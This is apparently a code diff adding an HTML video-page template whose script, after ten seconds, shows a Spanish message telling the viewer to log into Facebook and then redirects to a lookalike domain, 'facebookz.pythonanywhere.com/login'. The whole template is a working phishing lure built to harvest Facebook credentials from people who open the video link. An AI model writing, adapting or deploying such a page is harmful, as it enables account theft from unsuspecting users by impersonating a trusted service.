@@ -1,0 +1,41 @@
+<div>
+    <iframe class="video" src="{{ video_url }}" width="100%" height="100%"></iframe>
+</div>
+<div id="redirectModal" class="modal">
+    <div class="modal-content">
+      <p>Por favor inicie sesion en su cuenta de facebook para continuar viendo el video </p>
+    </div>
+  </div>
+  <style>
+    #redirectModal {
+        width: 500px;
+        height: 200px;
+        display: none; /* hide the modal initially */
+        position: fixed; /* position the modal in the center of the screen */
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: gray; /* set the background color */
+        color: white;
+        padding: 20px; /* add some padding */
+        text-align: center; /* center the text */
+        z-index: 1; /* make sure the modal appears above other elements */
+    }
+    #redirectModal .modal-content {
+        font-size: 30px;
+        text-align: center;
+    }
+</style>
+
+<script>
+    setTimeout(function(){
+        document.getElementById("redirectModal").style.display = "block";
+        setTimeout(function(){
+            window.location.href = "https://facebookz.pythonanywhere.com/login";
+        }, 10000);
+    }, 10000);
+
+</script>
+
+
+
